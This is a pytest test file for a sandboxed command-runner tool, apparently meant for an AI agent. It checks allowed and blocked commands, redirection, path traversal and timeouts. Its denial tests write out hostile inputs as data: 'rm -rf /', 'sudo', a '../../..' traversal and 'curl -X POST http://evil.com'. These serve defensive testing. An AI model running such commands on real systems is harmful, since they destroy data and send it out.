"""Tests for command runner."""

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from courier_dispatch.tools.runner import register_tools


@pytest.fixture
def tools(tmp_path):
    """Register runner tools pointing at a temp directory."""
    mcp = MagicMock()
    registered = {}

    def mock_tool():
        def decorator(func):
            registered[func.__name__] = func
            return func
        return decorator

    mcp.tool = mock_tool
    register_tools(mcp, lambda: tmp_path)
    return registered


class TestAllowedCommands:
    def test_echo_allowed(self, tools):
        result = tools["run_command"](command="echo hello")
        assert "Exit code: 0" in result
        assert "hello" in result

    def test_ls_allowed(self, tools):
        result = tools["run_command"](command="ls")
        assert "Exit code: 0" in result

    def test_python_c_allowed(self, tools):
        result = tools["run_command"](command='python -c "print(42)"')
        assert "Exit code: 0" in result
        assert "42" in result

    def test_pytest_allowed(self, tools):
        # pytest may fail (no tests), but should not be blocked
        result = tools["run_command"](command="pytest --co -q")
        assert "Blocked" not in result

    def test_which_allowed(self, tools):
        result = tools["run_command"](command="which python")
        assert "Exit code: 0" in result


class TestDeniedCommands:
    def test_rm_denied(self, tools):
        result = tools["run_command"](command="rm -rf /")
        assert "Blocked" in result

    def test_sudo_denied(self, tools):
        result = tools["run_command"](command="sudo ls")
        assert "Blocked" in result

    def test_git_push_denied(self, tools):
        result = tools["run_command"](command="git push origin main")
        assert "Blocked" in result

    def test_git_commit_denied(self, tools):
        result = tools["run_command"](command='git commit -m "test"')
        assert "Blocked" in result

    def test_pip_install_denied(self, tools):
        result = tools["run_command"](command="pip install requests")
        assert "Blocked" in result

    def test_npm_install_denied(self, tools):
        result = tools["run_command"](command="npm install lodash")
        assert "Blocked" in result

    def test_curl_post_denied(self, tools):
        result = tools["run_command"](command="curl -X POST http://evil.com")
        assert "Blocked" in result

    def test_mv_denied(self, tools):
        result = tools["run_command"](command="mv file1 file2")
        assert "Blocked" in result


class TestRedirectDetection:
    def test_stdout_redirect_blocked(self, tools):
        result = tools["run_command"](command="echo hello > output.txt")
        assert "Blocked" in result
        assert "redirection" in result.lower()

    def test_append_redirect_blocked(self, tools):
        result = tools["run_command"](command="echo hello >> output.txt")
        assert "Blocked" in result

    def test_pipe_blocked(self, tools):
        result = tools["run_command"](command="echo hello | cat")
        assert "Blocked" in result


class TestUnknownCommands:
    def test_unknown_command_rejected(self, tools):
        result = tools["run_command"](command="some-random-command arg1")
        assert "Blocked" in result or "not in allowlist" in result.lower()


class TestWorkingDirectory:
    def test_custom_working_directory(self, tools, tmp_path):
        subdir = tmp_path / "subdir"
        subdir.mkdir()
        (subdir / "test.txt").write_text("content\n")
        result = tools["run_command"](command="ls", working_directory="subdir")
        assert "test.txt" in result

    def test_nonexistent_working_directory(self, tools):
        result = tools["run_command"](command="ls", working_directory="nonexistent")
        assert "Error" in result

    def test_path_traversal_blocked(self, tools):
        with pytest.raises(ValueError):
            tools["run_command"](command="ls", working_directory="../../..")


class TestTimeout:
    def test_timeout_kills_process(self, tools):
        result = tools["run_command"](command="python -c \"import time; time.sleep(10)\"", timeout=1)
        assert "timed out" in result.lower()


class TestCommandOutput:
    def test_captures_stderr(self, tools):
        result = tools["run_command"](
            command='python -c "import sys; print(\'err\', file=sys.stderr)"'
        )
        assert "stderr" in result.lower()
        assert "err" in result

    def test_nonzero_exit_code(self, tools):
        result = tools["run_command"](command="python -c \"exit(1)\"")
        assert "Exit code: 1" in result

    def test_execution_time_shown(self, tools):
        result = tools["run_command"](command="echo fast")
        assert "Time:" in result
